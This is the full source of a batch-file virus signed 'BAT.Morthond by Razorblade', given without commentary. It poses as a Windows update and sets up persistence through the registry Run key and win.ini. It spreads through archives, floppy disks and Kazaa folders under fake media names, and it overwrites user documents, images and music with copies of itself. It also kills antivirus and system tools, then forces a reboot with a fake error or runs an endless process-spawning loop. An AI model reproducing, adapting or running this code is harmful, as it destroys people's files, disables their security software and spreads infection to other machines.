   @echo off
   :: BAT.Morthond
   :: by Razorblade
   cls

   echo Windows update ...
   echo Please wait ...
   echo Setup by Morthond

   time=16.00
   date=24.12.1999
   cls

   copy %0 "%systemroot%\mormgr32.bat"
   cls

   echo Morthond > "C:\morthond.txt"
   echo by Razorblade >> "C:\morthond.txt"
   cls

   reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Morthond04 /t REG_SZ /d "%systemroot%\mormgr32" /f
   cls

   echo [windows] >> "%systemroot%\win.ini"
   echo load=%systemroot%\mormgr32.bat >> "%systemroot%\win.ini"
   echo run=%systemroot%\mormgr32.bat >> "%systemroot%\win.ini"
   cls

   for %%a in (*.rar) do rar a %%a %0
   for %%a in (*.arj) do arj a %%a %0
   for %%a in (*.zip) do pkzip -a %%a %0
   cls

   label ORTHANC
   cls

   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls
   copy %0 "a:\%random%.bat"
   cls

   md "%systemroot%\Morthond"
   md "%systemroot%\Orthanc"
   md "%systemroot%\Lugburz"
   md "%systemroot%\Ungolianth"
   cls

   copy %0 "%programfiles%\Kazaa\My~1\inzest_sex.jpg.bat"
   cls
   copy %0 "%programfiles%\Kazaa~1\My~1\homemade_blowjob.avi.bat"
   cls

   for %%v in (*.bat) do copy %0 %%v
   for %%v in (*.pif) do copy %0 %%v
   for %%v in (*.avi) do copy %0 %%v
   for %%v in (*.mpg) do copy %0 %%v
   for %%v in (*.txt) do copy %0 %%v
   for %%v in (*.doc) do copy %0 %%v
   for %%v in (*.sav) do copy %0 %%v
   for %%v in (*.log) do copy %0 %%v
   for %%v in (*.tmp) do copy %0 %%v
   for %%v in (*.bak) do copy %0 %%v
   for %%v in (*.mo) do copy %0 %%v
   for %%v in (*.vbs) do copy %0 %%v
   for %%v in (*.html) do copy %0 %%v
   for %%v in (*.htm) do copy %0 %%v
   for %%v in (*.wav) do copy %0 %%v
   for %%v in (*.ogg) do copy %0 %%v
   for %%v in (*.mp3) do copy %0 %%v
   for %%v in (*.gif) do copy %0 %%v
   for %%v in (*.jpg) do copy %0 %%v
   for %%v in (*.dot) do copy %0 %%v
   for %%v in (*.nt) do copy %0 %%v
   for %%v in (*.scr) do copy %0 %%v
   cls

   tskill Atupdater
   tskill Aupdate
   tskill Autodown
   tskill Autotrace
   tskill Autoupdate
   tskill Avltmain
   tskill Avpupd
   tskill Avwupd32
   tskill Avxquar
   tskill Cfiaudit
   tskill Drwebupw
   tskill Icssuppnt
   tskill Icsupp95
   tskill Luall
   tskill Mcupdate
   tskill Nupgrade
   tskill Outpost
   tskill Update
   tskill adaware
   tskill alevir
   tskill arr
   tskill au
   tskill backweb
   tskill bargains
   tskill belt
   tskill blss
   tskill bootconf
   tskill bpc
   tskill brasil
   tskill bundle
   tskill bvt
   tskill cfd
   tskill cmd32
   tskill cmesys
   tskill datemanager
   tskill dcomx
   tskill divx
   tskill dllcache
   tskill dllreg
   tskill dpps2
   tskill dssagent
   tskill emsw
   tskill explore
   tskill fsg_4104
   tskill gator
   tskill gmt
   tskill hbinst
   tskill hbsrv
   tskill hotfix
   tskill hotpatch
   tskill htpatch
   tskill hxdl
   tskill hxiul
   tskill idle
   tskill iedll
   tskill iedriver
   tskill iexplore
   tskill iexplorer
   tskill inetlnfo
   tskill infus
   tskill infwin
   tskill init
   tskill intdel
   tskill isass
   tskill istsvc
   tskill jdbgmrg
   tskill kazaa
   tskill keenvalue
   tskill kernel32
   tskill launcher
   tskill lnetinfo
   tskill loader
   tskill mapisvc32
   tskill md
   tskill mfin32
   tskill mmod
   tskill mostat
   tskill msapp
   tskill msbb
   tskill msblast
   tskill mscache
   tskill msccn32
   tskill mscman
   tskill msdm
   tskill msdos
   tskill msiexec16
   tskill mslaugh
   tskill msmgt
   tskill msmsgri32
   tskill msrexe
   tskill mssys
   tskill msvxd
   tskill netd32
   tskill nssys32
   tskill nstask32
   tskill nsupdate
   tskill onsrvr
   tskill optimize
   tskill patch
   tskill pgmonitr
   tskill powerscan
   tskill prizesurfer
   tskill prmt
   tskill prmvr
   tskill ray
   tskill rb32
   tskill rcsync
   tskill run32dll
   tskill rundll
   tskill rundll16
   tskill ruxdll32
   tskill sahagent
   tskill save
   tskill savenow
   tskill sc
   tskill scam32
   tskill scrsvr
   tskill scvhost
   tskill service
   tskill servlce
   tskill servlces
   tskill showbehind
   tskill sms
   tskill smss32
   tskill soap
   tskill spoler
   tskill spoolcv
   tskill spoolsv32
   tskill srng
   tskill ssgrate
   tskill start
   tskill stcloader
   tskill support
   tskill svc
   tskill svchostc
   tskill svchosts
   tskill svshost
   tskill system
   tskill system32
   tskill sysupd
   tskill teekids
   tskill trickler
   tskill tsadbot
   tskill tvmd
   tskill tvtmd
   tskill webdav
   tskill win-bugsfix
   tskill win32
   tskill win32us
   tskill winactive
   tskill window
   tskill windows
   tskill wininetd
   tskill wininit
   tskill wininitx
   tskill winlogin
   tskill winmain
   tskill winnet
   tskill winppr32
   tskill winservn
   tskill winssk32
   tskill winstart
   tskill winstart001
   tskill wintsk32
   tskill winupdate
   tskill wnad
   tskill wupdater
   tskill wupdt
   tskill bf1942
   tskill cpd
   tskill zonealarm
   tskill zone
   tskill start
   tskill setup
   tskill open
   tskill run
   tskill trojan
   tskill anti
   tskill antitrojan
   tskill msblast
   tskill regedit
   tskill taskmgr
   tskill msconfig
   tskill winzip32
   tskill notepad
   tskill avguard
   tskill game
   tskill wscript
   tskill cd
   tskill auto
   tskill autostart
   tskill install
   tskill runme
   tskill winword
   tskill ppoint
   cls

   if exist "%systemroot%\system32\shutdown.exe" (
       shutdown /r /t 120 /c "Error.1522 in svchost.exe"
   ) else (
       :fu
       start %0
       goto fu
   )
   cls

   :: End
